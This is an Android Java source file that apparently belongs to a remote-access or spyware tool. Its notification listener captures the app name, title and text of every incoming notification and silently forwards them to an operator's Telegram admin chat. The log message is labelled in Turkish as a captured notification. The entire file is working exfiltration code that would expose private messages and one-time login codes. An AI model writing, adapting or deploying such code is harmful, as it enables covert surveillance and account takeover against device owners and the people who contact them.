package com.java.panel;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationService extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        CharSequence titleSeq = sbn.getNotification().extras.getCharSequence("android.title");
        CharSequence textSeq = sbn.getNotification().extras.getCharSequence("android.text");
        
        String title = titleSeq != null ? titleSeq.toString() : "";
        String text = textSeq != null ? textSeq.toString() : "";

        if (ShellService.instance != null && !text.isEmpty()) {
            String msg = "🔔 Bildirim Yakalandı [" + packageName + "]\nBaşlık: " + title + "\nİçerik: " + text;
            ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, msg);
        }
    }
}
